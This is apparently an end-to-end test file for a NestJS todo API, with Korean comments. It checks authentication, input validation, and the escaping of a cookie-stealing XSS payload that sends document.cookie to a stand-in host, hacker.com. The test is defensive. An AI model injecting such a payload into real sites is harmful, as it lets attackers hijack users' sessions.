import { Test } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import { ZodValidationPipe } from 'nestjs-zod';
import cookieParser from 'cookie-parser';
import request from 'supertest';
import { App } from 'supertest/types';
import { AppModule } from './../src/app.module';

async function createApp(): Promise<INestApplication<App>> {
  const moduleRef = await Test.createTestingModule({
    imports: [AppModule],
  }).compile();

  const app = moduleRef.createNestApplication();
  app.useGlobalPipes(new ZodValidationPipe());
  app.use(cookieParser());
  await app.init();
  return app;
}

describe('POST /todos — 인증', () => {
  let app: INestApplication<App>;

  beforeAll(async () => {
    app = await createApp();
  });

  afterAll(async () => {
    await app.close();
  });

  it('인증 없이 요청하면 401을 반환한다', async () => {
    const res = await request(app.getHttpServer()).post('/todos').send({
      title: '테스트',
      description: '설명',
    });

    expect(res.status).toBe(401);
  });
});

describe('POST /todos — 유효성 검사', () => {
  let app: INestApplication<App>;
  let authCookie: string;

  beforeAll(async () => {
    app = await createApp();

    const email = `e2e-${Date.now()}@test.com`;

    await request(app.getHttpServer()).post('/auth/signup').send({
      email,
      name: 'E2E User',
      password: 'Password123!',
    });

    const loginRes = await request(app.getHttpServer())
      .post('/auth/login')
      .send({ email, password: 'Password123!' });

    authCookie = (loginRes.headers['set-cookie']?.[0] ?? '').split(';')[0];
  });

  afterAll(async () => {
    await app.close();
  });

  it('제목에 XSS 페이로드 주입했는데 다털렸죠? ㅋㅋㅋㅋ', async () => {
    // 해커가 세션을 탈취하기 위해 흔히 주입하는 악성 스크립트 페이로드
    const xssPayload =
      '<script>fetch("http://hacker.com/steal?cookie=" + document.cookie)</script>';

    const res = await request(app.getHttpServer())
      .post('/todos')
      .set('Cookie', authCookie)
      .send({
        title: xssPayload,
        description: '대학생한테 다 털렸죠?',
      });

    // 1. 서버가 아예 400 Bad Request로 진입 금지를 하거나,
    // 2. 만약 201 Created로 저장을 허용하더라도 응답 값에는 날것의 <script> 태그가 그대로 남아있으면 안 됨 (이스케이프 및 정제 검증)
    if (res.status === 201) {
      expect(res.body.title).not.toContain('<script>');
      // 보통 &lt;script&gt; 형태로 안전하게 치환(Escape)되었는지 확인
      expect(res.body.title).toContain('&lt;script&gt;');
    } else {
      expect(res.status).toBe(400);
    }
  });

  it('잘못된 payload면 400을 반환한다', async () => {
    const res = await request(app.getHttpServer())
      .post('/todos')
      .set('Cookie', authCookie)
      .send({ title: '', description: 'test' });

    expect(res.status).toBe(400);
    expect(res.body).toHaveProperty('message');
    expect(res.body).not.toHaveProperty('stack');
  });
});
